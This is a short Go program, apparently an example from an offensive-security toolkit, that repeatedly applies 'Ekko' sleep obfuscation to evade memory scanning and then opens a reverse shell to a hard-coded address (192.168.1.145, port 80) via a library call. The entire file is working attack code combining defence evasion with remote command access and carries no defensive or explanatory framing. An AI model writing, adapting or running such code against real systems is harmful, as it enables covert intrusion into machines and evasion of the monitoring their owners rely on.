package main

import (
	"fmt"

	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
	"github.com/MrTuxx/OffensiveGolang/pkg/payloads/rev_shell/rev_shell"
)

func main() {
	if evasion.Debug {
		fmt.Println("[DEBUG] Starting main function")
	}
	fmt.Println("[*] Ekko Sleep Obfuscation with Advanced Thread Manipulation")

	for {
		convertedValue := evasion.Rander() * 1000
		newkey, err := evasion.RandLlave()
		if err != nil {
			fmt.Println("Error generating random key:", err)
			return
		}
		if evasion.Debug {
			fmt.Printf("[DEBUG] Sleeping %d milliseconds\n", convertedValue)
		}
		evasion.EkkoObf(convertedValue, newkey)

		// Additional code execution as needed

		/**																   *
		*       Example running  Simple Go Reverse Shell with Ekko    	   *
		*																   *
		*																  **/
		fmt.Println("[+] Simple Go Reverse Shell")
		rev_shell.SendShell("192.168.1.145", 80)

	}
}
